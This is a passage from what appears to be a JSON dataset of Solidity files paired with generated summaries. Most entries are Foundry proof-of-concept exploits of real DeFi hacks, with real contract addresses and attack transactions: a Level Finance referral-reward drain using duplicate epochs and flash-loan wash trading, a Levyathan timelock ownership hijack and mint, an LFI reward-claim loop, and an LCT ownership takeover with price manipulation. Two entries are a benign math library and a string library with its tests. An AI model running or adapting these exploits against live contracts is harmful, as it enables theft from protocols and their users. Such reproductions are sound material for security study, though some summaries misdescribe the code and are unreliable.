        "summary": "This is a Solidity smart contract that exploits a vulnerability in the LZ token smart contract. It sets up several interfaces with external smart contracts, including the UniRouter interface and the ERC20 token standard interface. The contract then executes a series of transactions on behalf of an attacker to steal funds from the LZ token smart contract. Specifically, it uses a payload to call an unverified contract to perform an exploit, which grants the attacker a large amount of LZ tokens. The contract then swaps those tokens for BUSD on the BISWAP router, and finally swaps the BUSD for more LZ tokens on the Pancake router, leaving the attacker with a significant amount of BUSD that they were not entitled to.",
        "id": "e68a09f2-7253-427a-b9e0-837806f6abf3"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1653149493133729794\n// https://twitter.com/BlockSecTeam/status/1653267431127920641\n// @TX\n// https://bscscan.com/tx/0x6aef8bb501a53e290837d4398b34d5d4d881267512cfe78eb9ba7e59f41dad04\n// https://bscscan.com/tx/0xe1f257041872c075cbe6a1212827bc346df3def6d01a07914e4006ec43027165\n// @Summary\n// Lack of checking for duplicate elements in arrays\n\ninterface IPool {\n    function swap(\n        address _tokenIn,\n        address _tokenOut,\n        uint256 _minOut,\n        address _to,\n        bytes calldata extradata\n    ) external;\n}\n\ninterface ILevelReferralControllerV2 {\n    struct UserInfo {\n        uint256 tier;\n        uint256 tradingPoint;\n        uint256 referralPoint;\n        uint256 claimed;\n    }\n\n    function claim(uint256 _epoch, address _to) external;\n    function claimMultiple(uint256[] calldata _epoches, address _to) external;\n    function setReferrer(address _referrer) external;\n    function currentEpoch() external view returns (uint256);\n    function claimable(uint256 _epoch, address _user) external view returns (uint256);\n    function setEnableNextEpoch(bool _enable) external;\n    function nextEpoch() external;\n}\n\ncontract ContractTest is Test {\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 LVL = IERC20(0xB64E280e9D1B5DbEc4AcceDb2257A87b400DB149);\n    ILevelReferralControllerV2 LevelReferralControllerV2 =\n        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);\n    IPool pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);\n    address dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;\n    Exploiter exploiter;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 27_830_139);\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(LVL), \"LVL\");\n        cheats.label(address(LevelReferralControllerV2), \"LevelReferralControllerV2\");\n        cheats.label(address(pool), \"pool\");\n        cheats.label(address(dodo), \"dodo\");\n    }\n\n    function testExploit() external {\n        deal(address(WBNB), address(this), 95 * 1e18);\n        exploiter = new Exploiter(address(this));\n        LevelReferralControllerV2.setReferrer(address(exploiter));\n        createReferral();\n        WashTrading();\n        vm.warp(block.timestamp + 1 * 60 * 60);\n        vm.startPrank(0x6023C6afa26a68E05672F111FdbB1De93cBAc621);\n        LevelReferralControllerV2.setEnableNextEpoch(true);\n        LevelReferralControllerV2.nextEpoch();\n        vm.stopPrank();\n        vm.warp(block.timestamp + 60 * 60);\n        claim();\n        vm.warp(block.timestamp + 5 * 60 * 60);\n        for (uint256 i; i < 11; i++) {\n            claimReward(2000);\n            vm.warp(block.timestamp + i * 15);\n        }\n\n        emit log_named_decimal_uint(\n            \"Attacker LVL Token balance after exploit\", LVL.balanceOf(address(this)), LVL.decimals()\n        );\n    }\n\n    function createReferral() internal {\n        for (uint256 i; i < 15; i++) {\n            new Referral(address(exploiter));\n        }\n        for (uint256 i; i < 15; i++) {\n            new Referral(address(this));\n        }\n    }\n\n    function WashTrading() internal {\n        DVM(dodo).flashLoan(300 * 1e18, 0, address(this), abi.encode(uint256(20)));\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        uint256 amount = abi.decode(data, (uint256));\n        for (uint256 i; i < amount; i++) {\n            WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));\n            pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(exploiter)));\n            USDT.transfer(address(pool), USDT.balanceOf(address(this)));\n            pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(exploiter)));\n        }\n        WBNB.transfer(address(exploiter), WBNB.balanceOf(address(this)));\n        exploiter.swap(20);\n        WBNB.transfer(dodo, 300 * 1e18);\n    }\n\n    function claim() internal {\n        LevelReferralControllerV2.claimable(13, address(this));\n        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;\n        LevelReferralControllerV2.claim(tokenID, address(this));\n        exploiter.claim(tokenID);\n    }\n\n    function claimReward(uint256 amount) internal {\n        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;\n        uint256[] memory _epoches = new uint256[](amount);\n        for (uint256 i; i < amount; i++) {\n            _epoches[i] = tokenID;\n        }\n        LevelReferralControllerV2.claimable(_epoches[0], address(this));\n        LevelReferralControllerV2.claimMultiple(_epoches, address(this));\n        exploiter.claimMultiple(amount);\n    }\n}\n\ncontract Exploiter {\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPool pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);\n    ILevelReferralControllerV2 LevelReferralControllerV2 =\n        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);\n\n    constructor(address _referrer) {\n        LevelReferralControllerV2.setReferrer(_referrer);\n    }\n\n    function swap(uint256 amount) external {\n        for (uint256 i; i < amount; i++) {\n            WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));\n            pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(msg.sender)));\n            USDT.transfer(address(pool), USDT.balanceOf(address(this)));\n            pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(msg.sender)));\n        }\n        WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));\n    }\n\n    function claim(uint256 tokenId) external {\n        LevelReferralControllerV2.claim(tokenId, msg.sender);\n    }\n\n    function claimMultiple(uint256 amount) external {\n        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;\n        uint256[] memory _epoches = new uint256[](amount);\n        for (uint256 i; i < amount; i++) {\n            _epoches[i] = tokenID;\n        }\n        LevelReferralControllerV2.claimMultiple(_epoches, msg.sender);\n    }\n}\n\ncontract Referral {\n    ILevelReferralControllerV2 LevelReferralControllerV2 =\n        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);\n\n    constructor(address _referrer) {\n        LevelReferralControllerV2.setReferrer(_referrer);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that contains three other contracts: `ContractTest`, `Exploiter`, and `Referral`. The `ContractTest` contract includes several functions that perform various actions, such as swapping tokens, creating referrals, and claiming rewards. The `Exploiter` contract also includes a `swap` function and a `claim` function, while the `Referral` contract simply sets a referrer for the `LevelReferralControllerV2` contract interface. \n\nThe overall purpose of the code is to exploit a vulnerability related to the lack of checking for duplicate elements in arrays in the `LevelReferralControllerV2` smart contract. This allows an attacker to exploit the referral system and claim rewards repeatedly. The exploit involves wash trading (making a large number of trades to manipulate the market) and flashing loans (borrowing a large amount of assets to make trades).",
        "id": "377fca32-ab18-4d57-b355-a91f6f92f6dd"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\n/*Key Information\nThe Levyathan developers left the private keys to a wallet with minting capability available on Github. -rekt\n\nAttacker Address                     : 0x7507f84610f6d656a70eb8cdec044674799265d3\nMasterChef(Vulnerable Contract)      : 0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4\nInitial Timelock Schedule Transaction: https://bscscan.com/address/0x7507f84610f6d656a70eb8cdec044674799265d3\nTransaction was scheduled            : https://bscscan.com/tx/0xfd30def124c1345606598ae4817ae184fc1918fc638111c6e71bc9752361fd87\nTransaction Executed                 : https://bscscan.com/tx/0xe6e504208ba90d121c3212a4f2547ae28e69790ab541d459c080ec8b1f3efab2\nPost-Moderm                          : https://levyathan-index.medium.com/post-mortem-levyathan-c3ff7f9a6f65\n\nPOC-Written by                       :Sentient-X\ntwitter                              :@sentient_x\n\nAll thanks to the creator of this awesome repo\n\n*/\ncontract ContractTest is Test {\n    \n    ILEV LEV = ILEV(0x304c62b5B030176F8d328d3A01FEaB632FC929BA);\n\t\n\tIMasterChef MasterChef = IMasterChef(0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4);\n        \n    ITimelock Timelock = ITimelock(0x16149999C85c3E3f7d1B9402a4c64d125877d89D);    \t\n    address attacker = 0x7507f84610f6D656a70eb8CDEC044674799265D3;\n\taddress Deployer = 0x6DeBA0F8aB4891632fB8d381B27eceC7f7743A14;\t\n\t\n\taddress user1 = 0x160B6772c9976d21ddFB3e3211989Fa099451af7;\n\taddress user2 = 0x2db0500e1942626944efB106D6A66755802Cef20;\n   \n\n    function setUp() public {\n        \t\t\n        vm.createSelectFork(\"bsc\",9545966); //fork bsc at block 9545967\n\t\t\n        vm.label(address(MasterChef), \"MasterChef\");\n        vm.label(address(LEV), \"LEV\");\n        vm.label(address(Timelock), \"Timelock\");\t\n\t\tvm.label(address(Deployer), \"Deployer\");\n\n    }\n\n    function test_Timelock() public {\n\t\n\tbytes memory Ownership_hijack = (abi.encodePacked(bytes4(keccak256(bytes(\"transferOwnership(address)\"))),abi.encode(address(attacker)))); \n\t\n        \n\t//Schedule a transaction from the Deployer current owner of timelock.\n\tvm.startPrank(address(Deployer));\t\n\t\t\n\tTimelock.schedule(\n\taddress(MasterChef),\n\t0,\n\tOwnership_hijack,\n\tbytes32(0),\n\tbytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764),\n\t172800);\t\n\t\n\t//Validate that transaction is in timelock\n\tbytes32 txHash = Timelock.hashOperation(\n    address(MasterChef),\n    0,\n    Ownership_hijack,\n    bytes32(0),\n    bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)\n        );\n\t\t\n\tassertTrue(Timelock.isOperationPending(txHash));\n\t\t\n\tvm.roll(9600775);\n\tvm.warp(block.timestamp + 172800);\n  \t\n\t//Execute transaction and validate state is updated\n    Timelock.execute(\t\n\taddress(MasterChef), \n\t0, \n\tOwnership_hijack, \n\tbytes32(0), \n\tbytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764));\n\t\n\tassertTrue(Timelock.isOperationDone(txHash));\n\tvm.stopPrank();\n\t\n\t//attacker address recovers LEV MasterChef Contract and mints 1 Octillion tokens\n\tvm.startPrank(address(attacker));\n\tMasterChef.recoverLevOwnership();\n\tLEV.mint(address(attacker),100000000000000000000000000);\n\tvm.stopPrank();\n\t\n\t//Typical user1 tries to leave staking but gets revert error\n\tvm.expectRevert();\n\tvm.startPrank(address(user1));\n\tMasterChef.leaveStaking(10000);\n\t\n\t\n\t//Same user1 tries to withdraw but gets another revert error\n\tvm.expectRevert();\n\tMasterChef.withdraw(3, 272356000000000000000000);\t\n\tvm.stopPrank();\n\t\n\t//user2 does emergency withdraw and succeeds\n\tvm.startPrank(address(user2));\n\tMasterChef.emergencyWithdraw(4);\n\tvm.stopPrank();\t\n\t\n\t//user2 does another emergency withdraw and succeeds again.(Its actually user 3/4 that abused the emergencyWithdraw() vulnerability) \n    vm.startPrank(address(user2));\n\tMasterChef.emergencyWithdraw(4);\n\tvm.stopPrank();\n\t\n\t\n    }\n}\n\ninterface ITimelock {\nfunction schedule(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt, uint256 delay) external;\nfunction hashOperation(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt) external returns (bytes32 hash);\nfunction isOperationPending(bytes32 id) external returns (bool pending);\nfunction execute(address target, uint256 value, bytes calldata payload, bytes32 predecessor, bytes32 salt) external;\nfunction isOperationDone(bytes32 id) external returns (bool done);\n\n}\n\ninterface ILEV {\nfunction mint(address receiver, uint256 amount) external;\n\n}\n\ninterface IMasterChef {\nfunction recoverLevOwnership() external;\nfunction leaveStaking(uint256 _amount) external;\nfunction withdraw(uint256 _pid, uint256 _amount) external;\nfunction emergencyWithdraw(uint256 _pid) external;\n\n}\n",
        "summary": "This code defines a Solidity contract that tests a vulnerability in the MasterChef contract, which allows an attacker to take over the ownership of the contract and mint a large number of tokens. The test contract uses a timelock contract to schedule the transfer of ownership of the MasterChef contract to the attacker. Once the transfer is complete, the attacker can recover the ownership of the LEV contract and mint a large number of tokens. The test contract then simulates users attempting to leave staking or withdraw funds from the MasterChef contract, but the contract reverts their transactions due to the attacker's actions.",
        "id": "38789a9c-8442-4dd9-9769-0619daf4979c"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~36K USD$\n// Attacker : https://polygonscan.com/address/0x11576cb3d8d6328cf319e85b10e09a228e84a8de\n// Attack Contract : https://polygonscan.com/address/0x43623b96936e854f8d85f893011f22ac91e58164\n// Vulnerable Contract : https://polygonscan.com/address/0xfc604b6fd73a1bc60d31be111f798dd0d4137812\n// Attack Tx : https://polygonscan.com/tx/0xdd82fde0cc2fb7bdc078aead655f6d5e75a267a47c33fa92b658e3573b93ef0c\n// Attack Tx : https://polygonscan.com/tx/0x051f80a7ef69e1ffad889ec7e1f7d29a9e80883156b5c8528438b5bb8b7a689a\n\n// @Info\n// Vulnerable Contract Code : https://polygonscan.com/address/0xe6e5f921c8cd480030efb16166c3f83abc85298d#code\n\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://twitter.com/AnciliaInc/status/1660767088699666433\n// Hacking God : https://www.google.com/\n\ninterface IVLFI is IERC20{\n    function claimRewards(address to) external;\n    function stake(address onBehalfOf, uint256 amount) external;\n}\ncontract ContractTest is Test {\n    IERC20 LFI = IERC20(0x77D97db5615dFE8a2D16b38EAa3f8f34524a0a74);\n    IVLFI VLFI = IVLFI(0xfc604b6fD73a1bc60d31be111F798dd0D4137812);\n    Claimer claimer;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"polygon\", 43025776);\n        cheats.label(address(LFI), \"LFI\");\n        cheats.label(address(VLFI), \"VLFI\");\n    }\n\n    function testExploit() external {\n        deal(address(LFI), address(this), 86_000 * 1e18);\n        claimer = new Claimer();\n        LFI.approve(address(VLFI), type(uint).max);\n        VLFI.stake(address(claimer), LFI.balanceOf(address(this)));\n        for(uint i; i < 200; i++){\n            address newClaimer = claimer.delegate(VLFI.balanceOf(address(claimer)), address(this));\n            claimer = Claimer(newClaimer);\n        }\n\n\n        emit log_named_decimal_uint(\n            \"Attacker LFI balance after exploit\", LFI.balanceOf(address(this)), LFI.decimals()\n        );\n    }\n\n    function claimReward(uint256 VLFITransferAmount, address owner) external returns(address){\n        VLFI.claimRewards(owner);\n        claimer = new Claimer();\n        VLFI.transfer(address(claimer), VLFITransferAmount);\n        return address(claimer);\n    }\n\n}\n\ncontract Claimer is Test{\n    IERC20 LFI = IERC20(0x77D97db5615dFE8a2D16b38EAa3f8f34524a0a74);\n    IVLFI VLFI = IVLFI(0xfc604b6fD73a1bc60d31be111F798dd0D4137812);\n    Claimer claimer;\n    function delegate(uint256 VLFITransferAmount, address owner) external returns(address){\n        (, bytes memory returnData) =  msg.sender.delegatecall(abi.encodeWithSignature(\"claimReward(uint256,address)\", VLFITransferAmount, owner));\n        return abi.decode(returnData, (address));\n    }\n}",
        "summary": "This is a Solidity contract that demonstrates a vulnerability in the vulnerable contract code provided in the comments. The contract is a test contract that exploits the vulnerability and logs the attacker's LFI token balance after the exploit. The exploit involves staking LFI tokens with the IVLFI contract and creating multiple claimer contracts to claim rewards repeatedly, allowing the attacker to receive an unreasonably large amount of rewards. The Claimer contract is used to delegate the call to the `claimReward` function in the main contract.",
        "id": "cde2e67f-c17f-466a-8ca7-8b44658f3c11"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nlibrary IntExtended {\n    \n    function increment(uint _self) public pure returns (uint) {\n        return _self+1;\n    }\n    \n    function decrement(uint _self) public pure returns (uint) {\n        return _self-1;\n    }\n    \n    function incrementByValue(uint _self, uint _value) public pure returns (uint) {\n        return _self + _value;\n    }\n    \n    function decrementByValue(uint _self, uint _value) public pure returns (uint) {\n        return _self - _value;\n    }\n}\n",
        "summary": "This code defines a library called \"IntExtended\" that contains four functions: increment, decrement, incrementByValue, and decrementByValue. Each function takes in an unsigned integer (_self) and performs a different mathematical operation on it. The library is written in Solidity version 0.4.0.",
        "id": "12f4318d-7230-4c70-817c-8bea3d8f0517"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\n/// @notice Efficient library for creating string representations of integers.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/LibString.sol)\n/// @author Modified from Solady (https://github.com/Vectorized/solady/blob/main/src/utils/LibString.sol)\nlibrary LibString {\n    function toString(int256 value) internal pure returns (string memory str) {\n        if (value >= 0) return toString(uint256(value));\n\n        unchecked {\n            str = toString(uint256(-value));\n\n            /// @solidity memory-safe-assembly\n            assembly {\n                // Note: This is only safe because we over-allocate memory\n                // and write the string from right to left in toString(uint256),\n                // and thus can be sure that sub(str, 1) is an unused memory location.\n\n                let length := mload(str) // Load the string length.\n                // Put the - character at the start of the string contents.\n                mstore(str, 45) // 45 is the ASCII code for the - character.\n                str := sub(str, 1) // Move back the string pointer by a byte.\n                mstore(str, add(length, 1)) // Update the string length.\n            }\n        }\n    }\n\n    function toString(uint256 value) internal pure returns (string memory str) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            // The maximum value of a uint256 contains 78 digits (1 byte per digit), but we allocate 160 bytes\n            // to keep the free memory pointer word aligned. We'll need 1 word for the length, 1 word for the\n            // trailing zeros padding, and 3 other words for a max of 78 digits. In total: 5 * 32 = 160 bytes.\n            let newFreeMemoryPointer := add(mload(0x40), 160)\n\n            // Update the free memory pointer to avoid overriding our string.\n            mstore(0x40, newFreeMemoryPointer)\n\n            // Assign str to the end of the zone of newly allocated memory.\n            str := sub(newFreeMemoryPointer, 32)\n\n            // Clean the last word of memory it may not be overwritten.\n            mstore(str, 0)\n\n            // Cache the end of the memory to calculate the length later.\n            let end := str\n\n            // We write the string from rightmost digit to leftmost digit.\n            // The following is essentially a do-while loop that also handles the zero case.\n            // prettier-ignore\n            for { let temp := value } 1 {} {\n                // Move the pointer 1 byte to the left.\n                str := sub(str, 1)\n\n                // Write the character to the pointer.\n                // The ASCII index of the '0' character is 48.\n                mstore8(str, add(48, mod(temp, 10)))\n\n                // Keep dividing temp until zero.\n                temp := div(temp, 10)\n\n                 // prettier-ignore\n                if iszero(temp) { break }\n            }\n\n            // Compute and cache the final total length of the string.\n            let length := sub(end, str)\n\n            // Move the pointer 32 bytes leftwards to make room for the length.\n            str := sub(str, 32)\n\n            // Store the string's length at the start of memory allocated for our string.\n            mstore(str, length)\n        }\n    }\n}\n",
        "summary": "This is a Solidity library called \"LibString\" that provides efficient ways to convert integer values to their string representation. It includes two functions, `toString(int256 value)` and `toString(uint256 value)` for converting signed and unsigned integers to strings respectively. \n\nThe library uses assembly code for memory management and optimization purposes, and the generated string is stored in a newly-allocated memory with a size of up to 160 bytes. For negative `int256` values, the minus sign is added to the left side of the string.",
        "id": "47fe7407-d55e-41d0-ad9a-cd61d989a48e"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\nimport {LibString} from \"../utils/LibString.sol\";\n\ncontract LibStringTest is DSTestPlus {\n    function testToString() public {\n        assertEq(LibString.toString(uint256(0)), \"0\");\n        assertEq(LibString.toString(uint256(1)), \"1\");\n        assertEq(LibString.toString(uint256(17)), \"17\");\n        assertEq(LibString.toString(uint256(99999999)), \"99999999\");\n        assertEq(LibString.toString(uint256(99999999999)), \"99999999999\");\n        assertEq(LibString.toString(uint256(2342343923423)), \"2342343923423\");\n        assertEq(LibString.toString(uint256(98765685434567)), \"98765685434567\");\n    }\n\n    function testToStringIntPositive() public {\n        assertEq(LibString.toString(int256(0)), \"0\");\n        assertEq(LibString.toString(int256(1)), \"1\");\n        assertEq(LibString.toString(int256(17)), \"17\");\n        assertEq(LibString.toString(int256(99999999)), \"99999999\");\n        assertEq(LibString.toString(int256(99999999999)), \"99999999999\");\n        assertEq(LibString.toString(int256(2342343923423)), \"2342343923423\");\n        assertEq(LibString.toString(int256(98765685434567)), \"98765685434567\");\n    }\n\n    function testToStringIntNegative() public {\n        assertEq(LibString.toString(int256(-0)), \"0\");\n        assertEq(LibString.toString(int256(-17)), \"-17\");\n        assertEq(LibString.toString(int256(-99999999)), \"-99999999\");\n        assertEq(LibString.toString(int256(-99999999999)), \"-99999999999\");\n        assertEq(LibString.toString(int256(-2342343923423)), \"-2342343923423\");\n        assertEq(LibString.toString(int256(-98765685434567)), \"-98765685434567\");\n    }\n\n    function testDifferentiallyFuzzToString(uint256 value, bytes calldata brutalizeWith)\n        public\n        brutalizeMemory(brutalizeWith)\n    {\n        string memory libString = LibString.toString(value);\n        string memory oz = toStringOZ(value);\n\n        assertEq(bytes(libString).length, bytes(oz).length);\n        assertEq(libString, oz);\n    }\n\n    function testDifferentiallyFuzzToStringInt(int256 value, bytes calldata brutalizeWith)\n        public\n        brutalizeMemory(brutalizeWith)\n    {\n        string memory libString = LibString.toString(value);\n        string memory oz = toStringOZ(value);\n\n        assertEq(bytes(libString).length, bytes(oz).length);\n        assertEq(libString, oz);\n    }\n\n    function testToStringOverwrite() public {\n        string memory str = LibString.toString(uint256(1));\n\n        bytes32 data;\n        bytes32 expected;\n\n        assembly {\n            // Imagine a high level allocation writing something to the current free memory.\n            // Should have sufficient higher order bits for this to be visible\n            mstore(mload(0x40), not(0))\n            // Correctly allocate 32 more bytes, to avoid more interference\n            mstore(0x40, add(mload(0x40), 32))\n            data := mload(add(str, 32))\n\n            // the expected value should be the uft-8 encoding of 1 (49),\n            // followed by clean bits. We achieve this by taking the value and\n            // shifting left to the end of the 32 byte word\n            expected := shl(248, 49)\n        }\n\n        assertEq(data, expected);\n    }\n\n    function testToStringDirty() public {\n        uint256 freememptr;\n        // Make the next 4 bytes of the free memory dirty\n        assembly {\n            let dirty := not(0)\n            freememptr := mload(0x40)\n            mstore(freememptr, dirty)\n            mstore(add(freememptr, 32), dirty)\n            mstore(add(freememptr, 64), dirty)\n            mstore(add(freememptr, 96), dirty)\n            mstore(add(freememptr, 128), dirty)\n        }\n        string memory str = LibString.toString(uint256(1));\n        uint256 len;\n        bytes32 data;\n        bytes32 expected;\n        assembly {\n            freememptr := str\n            len := mload(str)\n            data := mload(add(str, 32))\n            // the expected value should be the uft-8 encoding of 1 (49),\n            // followed by clean bits. We achieve this by taking the value and\n            // shifting left to the end of the 32 byte word\n            expected := shl(248, 49)\n        }\n        emit log_named_uint(\"str: \", freememptr);\n        emit log_named_uint(\"len: \", len);\n        emit log_named_bytes32(\"data: \", data);\n        assembly {\n            freememptr := mload(0x40)\n        }\n        emit log_named_uint(\"memptr: \", freememptr);\n\n        assertEq(data, expected);\n    }\n}\n\nfunction toStringOZ(int256 value) pure returns (string memory) {\n    return string(abi.encodePacked(value < 0 ? \"-\" : \"\", toStringOZ(absOZ(value))));\n}\n\nfunction toStringOZ(uint256 value) pure returns (string memory) {\n    if (value == 0) {\n        return \"0\";\n    }\n    uint256 temp = value;\n    uint256 digits;\n    while (temp != 0) {\n        digits++;\n        temp /= 10;\n    }\n    bytes memory buffer = new bytes(digits);\n    while (value != 0) {\n        digits -= 1;\n        buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n        value /= 10;\n    }\n    return string(buffer);\n}\n\nfunction absOZ(int256 n) pure returns (uint256) {\n    unchecked {\n        // must be unchecked in order to support `n = type(int256).min`\n        return uint256(n >= 0 ? n : -n);\n    }\n}\n",
        "summary": "This code defines a Solidity contract `LibStringTest` which tests the functionality of the `LibString` library. It includes tests for converting unsigned integers, signed integers (both positive and negative), and also includes tests for \"differentially fuzzing\" the `toString()` function. Finally, it includes helper functions for comparing the output of `LibString.toString()` with another implementation, and also includes functions for computing the absolute value of a signed integer.",
        "id": "97317065-28ce-4ce8-891b-43ed82c192a8"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/numencyber/status/1661213691893944320\n// @TX\n// https://explorer.phalcon.xyz/tx/bsc/0x57b589f631f8ff20e2a89a649c4ec2e35be72eaecf155fdfde981c0fec2be5ba\n// https://explorer.phalcon.xyz/tx/bsc/0xbea605b238c85aabe5edc636219155d8c4879d6b05c48091cf1f7286bd4702ba\n// https://explorer.phalcon.xyz/tx/bsc/0x49a3038622bf6dc3672b1b7366382a2c513d713e06cb7c91ebb8e256ee300dfb\n// https://explorer.phalcon.xyz/tx/bsc/0x042b8dc879fa193acc79f55a02c08f276eaf1c4f7c66a33811fce2a4507cea63\n// @Summary\n// not open source; maybe inproper access control\n\ninterface LCTExchange {\n    function buyTokens() external payable;\n}\n\n\ncontract LCTExp is Test {\n    address victim_proxy = 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41;\n    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    LCTExchange exchange = LCTExchange(0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06);\n    IERC20 LCT = IERC20(0x5C65BAdf7F97345B7B92776b22255c973234EfE7);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28460897);\n        deal(address(this), 1 ether);\n    }\n\n    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker BNB Balance\", address(this).balance, 18);\n\n        // Step1: get ownership\n        bytes4 selector1 = 0xb5863c10; \n        address temp = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE; // seems just some random meaningless address\n        bytes memory data1 = new bytes(36);\n        assembly {\n            mstore(add(data1, 0x20), selector1)\n            mstore(add(data1, 0x24), temp)\n        }\n        (bool success1, ) = victim_proxy.call(data1);\n        require(success1, \"change ownership failed\");\n\n        // Step2: manipulate price\n        bytes4 selector2 = 0x925d400c;\n        uint256 new_price = 1;\n        bytes memory data2 = new bytes(36);\n        assembly {\n            mstore(add(data2, 0x20), selector2)\n            mstore(add(data2, 0x24), new_price)\n        }\n        (bool success2, ) = victim_proxy.call(data2);\n        require(success2, \"manipulate price failed\");\n\n        // Step3: buy cheap LCT\n        // emit log_named_decimal_uint(\"LCT Balance of Exchange\", LCT.balanceOf(address(exchange)), 18);\n        uint256 amount = LCT.balanceOf(address(exchange)) / 1e18;\n        exchange.buyTokens{value: amount}();\n        // emit log_named_decimal_uint(\"LCT Balance of contract\", LCT.balanceOf(address(this)), 18);\n\n        // Step4: swap cheap LCT to BNB in dex\n        LCT.approve(address(router), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(LCT);\n        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            LCT.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 1000\n        );\n        \n\n        emit log_named_decimal_uint(\"[End] Attacker BNB Balance\", address(this).balance, 18);\n    }\n\n    \n    receive() external payable {}\n    \n}\n\n\n",
        "summary": "This is a Solidity contract that performs an attack on a victim contract called `victim_proxy`. \n\nThe contract interacts with IPancakeRouter, LCTExchange, and IERC20 contracts for swapping tokens and buying LCT tokens.  \n\nThe `setUp` function is executed first and it creates a fork on the Binance Smart Chain and sends 1 ether to the contract. \n\nThe `testExp` function then performs the attack in several steps:\n\n1. Calls the `changeOwnership` function on the `victim_proxy` contract to attempt to take ownership of the contract.\n\n2. Calls the `manipulatePrice` function on the `victim_proxy` contract to manipulate the price.\n\n3. Buys cheap LCT tokens from the `LCTExchange` contract and approves the transfer to the `IPancakeRouter` contract.\n\n4. Swaps the LCT tokens for BNB using `IPancakeRouter` and transfers the BNB back to the attacker's address.\n\nThe `receive` function allows the contract to receive BNB transfers. \n\nOverall, the code appears to be performing a malicious attack on the `victim_proxy` contract using improper access control.",
        "id": "18a7bc52-57fa-4e37-8abb-ec872015a08b"
    },
    {
